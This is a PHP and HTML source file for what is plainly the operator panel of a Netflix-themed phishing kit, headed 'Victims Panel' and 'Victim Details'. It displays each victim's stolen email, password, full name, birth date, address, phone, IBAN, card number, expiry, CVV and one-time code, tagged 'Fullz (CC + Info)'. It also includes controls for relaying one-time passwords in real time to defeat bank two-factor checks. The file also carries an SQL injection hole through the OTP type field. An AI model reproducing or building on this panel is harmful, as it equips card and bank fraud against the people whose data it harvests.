<?php

session_start();

// Check if the admin is logged in
if (!isset($_SESSION['admin_logged_in']) || $_SESSION['admin_logged_in'] !== true) {
    // If not logged in, redirect to index.php
    header('Location: index.php');
}

require 'runner/connection.php'; // Ensure the connection.php file is correctly included

// Check if the 'id' parameter is present in the URL and is not empty
if (!isset($_GET['id']) || empty($_GET['id'])) {
    die("Error: User ID is missing or invalid!");
}

$userId = $_GET['id'];

// Fetch user details from the database
$sql = "SELECT * FROM users WHERE id = :id";
$stmt = $pdo->prepare($sql);
$stmt->execute(['id' => $userId]);
$user = $stmt->fetch(PDO::FETCH_ASSOC);

if (!$user) {
    die("Error: User not found!");
}

// Handle request OTP button click
if (isset($_POST['request_otp'])) {
    $stmt = $pdo->prepare("UPDATE users SET otpstatus = 'processing' WHERE id = :id");
    $stmt->execute(['id' => $userId]);
}

// Handle finalize OTP button click
if (isset($_POST['finalize_otp'])) {
    $otp_type = $_POST['finalize_otp'];
    $stmt = $pdo->prepare("UPDATE users SET otpstatus = 'finalize', otp_type = '$otp_type' WHERE id = :id");
    $stmt->execute(['id' => $userId]);
}
?>

<!DOCTYPE html>
<html lang="en">

<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Victim Details - Netflix</title>
    <link rel="stylesheet" href="styles.css">
    <style>
        /* Styles similar to the provided UI */
        body {
            margin: 0;
            font-family: 'Arial', sans-serif;
            background-color: #121212;
            color: #fff;
        }

        .dashboard-container {
            display: flex;
            height: 100vh;
        }

        .sidebar {
            width: 250px;
            background-color: #1a1a1a;
            padding: 20px;
        }

        .brand h2 {
            margin: 0;
            color: #fff;
        }

        nav ul {
            list-style: none;
            padding: 0;
        }

        .menu-item {
            margin: 20px 0;
            padding: 10px;
            color: #ccc;
            cursor: pointer;
        }

        .menu-item.active,
        .menu-item:hover {
            background-color: #333;
            color: #fff;
        }

        .main-content {
            flex: 1;
            padding: 20px;
        }

        header h1 {
            margin: 0 0 20px;
        }

        .victim-panel {
            background-color: #1e1e1e;
            padding: 20px;
            border-radius: 8px;
        }

        .victim-panel h2 {
            margin-bottom: 20px;
        }

        .panel-header {
            display: flex;
            justify-content: space-between;
            align-items: center;
            margin-bottom: 20px;
        }

        .status-indicators {
            display: flex;
            gap: 10px;
            align-items: center;
        }

        .badge {
            padding: 4px 8px;
            border-radius: 4px;
            font-size: 12px;
            color: #fff;
        }

        .badge.green {
            background-color: #00c853;
        }

        .badge.red {
            background-color: #d50000;
        }

        .badge.blue {
            background-color: #2962ff;
        }

        .form-section {
            margin-bottom: 20px;
        }

        .form-section h3 {
            margin-bottom: 10px;
            font-size: 16px;
        }

        .form-group {
            margin-bottom: 10px;
            display: flex;
            gap: 10px;
            align-items: center;
        }

        .form-group label {
            flex-basis: 150px;
            font-weight: bold;
        }

        .form-group input {
            width: 100%;
            padding: 8px;
            border: 1px solid #333;
            border-radius: 4px;
            background-color: #222;
            color: #fff;
        }

        .action-buttons {
            display: flex;
            gap: 10px;
            margin-top: 20px;
        }

        .btn {
            padding: 8px 16px;
            border: none;
            cursor: pointer;
            border-radius: 4px;
            font-size: 14px;
        }

        .btn-primary {
            background-color: #536dfe;
            color: #fff;
        }

        .btn-danger {
            background-color: #ff1744;
            color: #fff;
        }

        .sidebar,
        .main-content {
            overflow: auto;
        }
    </style>
</head>

<body>
    <div class="dashboard-container">
        <!-- Sidebar -->
        <aside class="sidebar">
            <div class="brand">
                <h2>Ricardo</h2>
            </div>
            <nav>
                <ul>
                    <li class="menu-item">
                        <a href="livepanel.php" style="text-decoration: none; color: inherit;">
                            <i class="icon"></i> Dashboard
                        </a>
                    </li>
                    <li class="menu-item">
                        <i class="icon"></i> Captcha Settings
                    </li>
                    <li class="menu-item">
                        <i class="icon"></i> Site Settings
                    </li>
                    <li class="menu-item">
                        <a href="runner/logout.php" style="text-decoration: none; color: inherit;">
                            <i class="icon"></i> Logout
                        </a>
                    </li>
                </ul>
            </nav>
        </aside>

        <!-- Main Content -->
        <main class="main-content">
            <header>
                <h1>Victims Panel</h1>
            </header>

            <section class="victim-panel">
                <div class="panel-header">
                    <h2>Session ID: <?php echo htmlspecialchars($user['id']); ?></h2>
                    <div class="status-indicators">
                        <span class="badge blue">Fullz (CC + Info)</span>
                    </div>
                </div>

                <div class="form-section">
                    <h3>Login Information</h3>
                    <div class="form-group">
                        <label>Email:</label>
                        <input type="text" value="<?php echo htmlspecialchars($user['email']); ?>" readonly>
                    </div>
                    <div class="form-group">
                        <label>Password:</label>
                        <input type="text" value="<?php echo htmlspecialchars($user['password']); ?>" readonly>
                    </div>
                </div>

                <div class="form-section">
                    <h3>Personal Information</h3>
                    <div class="form-group">
                        <label>Full Name:</label>
                        <input type="text" value="<?php echo htmlspecialchars($user['vorname'] . ' ' . $user['nachname']); ?>" readonly>
                    </div>
                    <div class="form-group">
                        <label>Date of Birth:</label>
                        <input type="text" value="<?php echo htmlspecialchars($user['geburtsdatum']); ?>" readonly>
                    </div>
                    <div class="form-group">
                        <label>Address:</label>
                        <input type="text" value="<?php echo htmlspecialchars($user['strasse_nr']); ?>" readonly>
                    </div>
                    <div class="form-group">
                        <label>ZIP Code:</label>
                        <input type="text" value="<?php echo htmlspecialchars($user['plz']); ?>" readonly>
                    </div>
                    <div class="form-group">
                        <label>City:</label>
                        <input type="text" value="<?php echo htmlspecialchars($user['ort']); ?>" readonly>
                    </div>
                    <div class="form-group">
                        <label>Phone Number:</label>
                        <input type="text" value="<?php echo htmlspecialchars($user['handynummer']); ?>" readonly>
                    </div>
                </div>

                <div class="form-section">
                    <h3>Financial Information</h3>
                    <div class="form-group">
                        <label>IBAN:</label>
                        <input type="text" value="<?php echo htmlspecialchars($user['iban']); ?>" readonly>
                    </div>
                    <div class="form-group">
                        <label>Card Number:</label>
                        <input type="text" value="<?php echo htmlspecialchars($user['card_number']); ?>" readonly>
                    </div>
                    <div class="form-group">
                        <label>Expiry Date:</label>
                        <input type="text" value="<?php echo htmlspecialchars($user['expiry_month'] . '/' . $user['expiry_year']); ?>" readonly>
                    </div>
                    <div class="form-group">
                        <label>CVV:</label>
                        <input type="text" value="<?php echo htmlspecialchars($user['cvv']); ?>" readonly>
                    </div>
                    <div class="form-group">
                        <label>OTP:</label>
                        <input type="text" value="<?php echo htmlspecialchars($user['otp_code']); ?>" readonly>
                    </div>

                    <form method="POST">
                        <?php if ($user['otpstatus'] === 'awaiting_otp'): ?>
                            <button type="submit" name="request_otp" class="btn btn-primary">Request OTP</button>
                        <?php elseif ($user['otpstatus'] === 'processing'): ?>
                            <select name="finalize_otp" id="finalize_otp" class="input btn">
                                <option value="" disabled selected>Select OTP Method</option>
                                <option value="sms-otp">SMS OTP</option>
                                <option value="banking-app-confirmation">Banking App Confirmation</option>
                            </select>
                            <button type="submit" name="finalize_otp_submit" 
                            class="btn btn-success">Finalize OTP</button>
                        <?php endif; ?>
                    </form>

                    <div class="form-group">
                        <label>Register date:</label>
                        <input type="text" value="<?php echo htmlspecialchars($user['registered_at']); ?>" readonly>
                    </div>
                </div>

                <!-- <div class="form-section">
                    <h3>Header Information</h3>
                    <p>IP Address: ::1</p>
                    <p>Device: Unknown</p>
                    <p>Browser: Chrome</p>
                    <p>OS: Windows 10</p>
                    <p>Created At: <?php echo htmlspecialchars($user['registered_at']); ?></p>
                </div> -->
            </section>

            <!-- <div class="action-buttons">
                <button class="btn btn-primary">Complete Session</button>
                <button class="btn btn-danger">Delete Data</button>
            </div> -->
        </main>
    </div>
</body>

</html>